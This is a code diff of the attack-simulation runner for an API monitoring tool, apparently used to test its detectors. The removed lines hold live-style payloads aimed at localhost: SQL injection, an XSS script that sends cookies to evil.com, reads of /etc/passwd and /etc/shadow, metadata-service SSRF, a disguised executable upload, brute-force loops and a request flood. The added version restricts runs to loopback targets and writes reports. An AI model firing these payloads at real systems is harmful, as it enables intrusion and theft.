@@ -1,140 +1,88 @@
-import * as readline from 'readline';
-
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout
-});
-
-const pause = () => new Promise<void>(resolve => rl.question('\n>>> Press <Enter> to fire this attack...', () => resolve()));
-
-const BASE_URL = 'http://localhost:3000';
-
-const attacks = [
-  {
-    name: 'SQL Injection',
-    desc: 'Attempting to bypass authentication or extract data by appending SQL commands to the query.',
-    run: async () => {
-      await fetch(`${BASE_URL}/search?q=admin' UNION SELECT * FROM users--`);
-    }
-  },
-  {
-    name: 'Cross-Site Scripting (XSS)',
-    desc: 'Injecting malicious JavaScript into the search query to be reflected back to users.',
-    run: async () => {
-      await fetch(`${BASE_URL}/search?q=<script>fetch('http://evil.com?cookie='+document.cookie)</script>`);
-    }
-  },
-  {
-    name: 'Path Traversal',
-    desc: 'Manipulating file paths to access sensitive system files like /etc/passwd.',
-    run: async () => {
-      await fetch(`${BASE_URL}/profile/..%2f..%2f..%2fetc%2fpasswd`);
-    }
-  },
-  {
-    name: 'Command Injection',
-    desc: 'Executing arbitrary shell commands on the host system via unsanitized input.',
-    run: async () => {
-      await fetch(`${BASE_URL}/search?q=; cat /etc/shadow`);
-    }
-  },
-  {
-    name: 'Brute-force Login',
-    desc: 'Trying many different passwords against a single user account quickly.',
-    run: async () => {
-      for (let i = 0; i < 5; i++) {
-        await fetch(`${BASE_URL}/login`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: 'admin', password: `wrong${i}` })
-        });
-      }
-    }
-  },
-  {
-    name: 'Credential Stuffing',
-    desc: 'Testing a single exposed password across many different usernames.',
-    run: async () => {
-      for (let i = 0; i < 5; i++) {
-        await fetch(`${BASE_URL}/login`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: `user${i}`, password: 'exposedPassword123' })
-        });
-      }
-    }
-  },
-  {
-    name: 'SSRF Attempt',
-    desc: 'Forcing the server to make a request to its own internal cloud metadata service.',
-    run: async () => {
-      await fetch(`${BASE_URL}/fetch?url=http://169.254.169.254/latest/meta-data/`);
-    }
-  },
-  {
-    name: 'Malicious File Upload',
-    desc: 'Uploading a Windows Executable (MZ) disguised as a harmless PNG image.',
-    run: async () => {
-      const body = new FormData();
-      const executable = Uint8Array.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
-      body.append('file', new Blob([executable], { type: 'image/png' }), 'innocent.png');
-      await fetch(`${BASE_URL}/upload`, {
-        method: 'POST',
-        body: body
-      });
-    }
-  },
-  {
-    name: 'Scanner / Attack Tool Signature',
-    desc: 'Probing the API using an automated vulnerability scanner tool (sqlmap).',
-    run: async () => {
-      await fetch(`${BASE_URL}/search?q=test`, {
-        headers: { 'User-Agent': 'sqlmap/1.5.8#dev (http://sqlmap.org)' }
-      });
-    }
-  },
-  {
-    name: 'Endpoint Enumeration',
-    desc: 'Rapidly scanning for hidden files or admin panels, resulting in many 404 Not Found errors.',
-    run: async () => {
-      for (let i = 0; i < 15; i++) {
-        await fetch(`${BASE_URL}/hidden-admin-panel-${i}`);
-      }
-    }
-  },
-  {
-    name: 'Request Flood / DDoS',
-    desc: 'Overwhelming the server with a high volume of requests to cause denial of service.',
-    run: async () => {
-      const promises = [];
-      for (let i = 0; i < 50; i++) {
-        promises.push(fetch(`${BASE_URL}/search?q=ddos`));
-      }
-      await Promise.all(promises);
-    }
-  }
-];
+import 'dotenv/config';
+import { readFile, mkdir, writeFile } from 'fs/promises';
+import { resolve, join } from 'path';
+import { SimulationRun, SimulationOptions, scenarioNames } from '../shared/simulation';
+import { reportCsv, reportHtml } from '../shared/report';
+import { buildPlan, parseOptions } from './catalog';
 
 async function main() {
-  console.log('====================================================');
-  console.log('   SentinelAPI Attack Simulation Tool');
-  console.log('====================================================\n');
-  
-  for (const attack of attacks) {
-    console.log(`\n[NEXT ATTACK] ${attack.name}`);
-    console.log(`Description : ${attack.desc}`);
-    await pause();
-    console.log(`> Firing ${attack.name} payload...`);
-    try {
-      await attack.run();
-      console.log('> Done. Check the dashboard!');
-    } catch (e) {
-      console.log('> Error running attack:', (e as Error).message);
-    }
-  }
+  const args = process.argv.slice(2);
+  const help = `
+SentinelAPI local security simulation
+  npm run sim -- [options]
+  --scenario all|sqli,xss,command,brute,spraying,ssrf,upload,scanner,traversal,enumeration,flood,benign
+  --profile standard|extended    Standard: controlled regression suite; extended: raw SecLists probes
+  --password-limit 20            Dictionary candidates, 5–200 (25-attempt independent trials)
+  --wordlist ./passwords.txt      Optional custom newline-separated list, up to 1,000 entries
+  --output ./reports             Save JSON, CSV, and HTML evidence
+  --list                         Show planned scenarios without sending requests
+  --all                          Run the suite (also the default)
+  --help                         Show this help
 
-  console.log('\nAll attacks simulated successfully.');
-  rl.close();
+Environment: API_BASE_URL (loopback only), SENTINEL_USERNAME, SENTINEL_PASSWORD
+The username/password authenticate the runner. Dictionary guesses target the separate local /login lab.
+`;
+  if (args.includes('--help')) { console.log(help); return; }
+  const values: Record<string,string> = {};
+  for (let i = 0; i < args.length; i++) {
+    const flag = args[i];
+    if (['--all','--list'].includes(flag)) continue;
+    if (!['--scenario','--profile','--password-limit','--wordlist','--output'].includes(flag) || !args[i+1] || args[i+1].startsWith('--')) throw new Error('Unknown/missing argument: ' + flag + '\n' + help);
+    values[flag] = args[++i];
+  }
+  const input: Partial<SimulationOptions> = {
+    profile: (values['--profile'] || 'standard') as 'standard' | 'extended',
+    scenarios: values['--scenario'] && values['--scenario'] !== 'all' ? values['--scenario'].split(',') : undefined,
+    passwordLimit: Number(values['--password-limit'] || 20)
+  };
+  if (values['--wordlist']) input.passwords = (await readFile(resolve(values['--wordlist']), 'utf8')).split(/\r?\n/).filter(Boolean);
+  const options = parseOptions(input);
+  const plan = buildPlan(options);
+  console.log('\nSentinelAPI — local security simulation');
+  console.log('Source:', plan.source);
+  console.table(options.scenarios.map(key => ({ scenario: key, detector: scenarioNames[key], requests: plan.cases.filter(item => item.scenario === key).length })));
+  console.log(`Total: ${plan.cases.length} test requests; ${plan.passwordCount} password candidates (redacted).`);
+  if (args.includes('--list')) return;
+
+  const target = new URL(process.env.API_BASE_URL || 'http://localhost:3000');
+  if (!['http:','https:'].includes(target.protocol) || !['localhost','127.0.0.1','[::1]'].includes(target.hostname) || target.username || target.password || target.pathname !== '/' || target.search || target.hash) throw new Error('API_BASE_URL must be a loopback origin such as http://localhost:3000');
+  const base = target.origin;
+  async function api(path: string, token?: string, method = 'GET', body?: unknown) {
+    const response = await fetch(base + path, { method, headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}), ...(body ? { 'Content-Type': 'application/json' } : {}) }, body: body ? JSON.stringify(body) : undefined, redirect: 'error', signal: AbortSignal.timeout(15_000) });
+    const data = await response.json() as any;
+    if (!response.ok) throw new Error(`HTTP ${response.status}: ${data.error || data.status || 'API request failed'}`);
+    return data;
+  }
+  await api('/health');
+  const login = await api('/auth/login', undefined, 'POST', { username: process.env.SENTINEL_USERNAME || 'admin', password: process.env.SENTINEL_PASSWORD || 'sentinel123' });
+  let run: SimulationRun = await api('/simulations', login.token, 'POST', options);
+  console.log(`Run: ${run.id}\nTarget: ${base}\n`);
+  const cancel = () => { void api(`/simulations/${run.id}/cancel`, login.token, 'POST').catch(() => undefined); };
+  process.once('SIGINT', cancel);
+  let seen = 0;
+  const deadline = Date.now() + 180_000;
+  while (run.status === 'running') {
+    if (Date.now() > deadline) { cancel(); throw new Error('Run exceeded three minutes; cancellation requested. Check Simulations in the dashboard.'); }
+    await new Promise(resolve => setTimeout(resolve, 500));
+    run = await api(`/simulations/${run.id}`, login.token);
+    for (const row of run.report?.cases.slice(seen) || []) {
+      console.log(`${row.passed ? 'PASS' : 'FAIL'} ${row.scenario.padEnd(12)} ${row.name} | HTTP ${row.status} | ${row.latencyMs} ms | alerts: ${row.alertIds.join(',') || 'none'}`);
+    }
+    seen = run.progress;
+  }
+  process.removeListener('SIGINT', cancel);
+  const output = resolve(values['--output'] || 'reports');
+  await mkdir(output, { recursive: true });
+  const stem = join(output, `sentinel-${run.id}`);
+  await writeFile(stem + '.json', JSON.stringify(run, null, 2));
+  await writeFile(stem + '.csv', reportCsv(run));
+  await writeFile(stem + '.html', reportHtml(run));
+  console.table(run.report?.coverage.map(row => ({ scenario: row.scenario, cases: row.total, pass: row.passed, fail: row.failed })) || []);
+  console.log(`Status: ${run.status} | Passed: ${run.report?.passed || 0} | Failed: ${run.report?.failed || 0} | False positives: ${run.report?.falsePositives || 0} | Missing expected alerts: ${run.report?.missedDetections || 0}`);
+  if (run.error) console.error(run.error);
+  console.log('Reports:', stem + '.json', stem + '.csv', stem + '.html');
+  console.log('A missed signature indicates detector coverage, not proof that code executed. See HTML report for evidence.');
+  if (run.status !== 'completed' || run.report?.failed) process.exitCode = 1;
 }
 
-main();
+main().catch(error => { console.error((error as Error).message); process.exitCode = 1; });
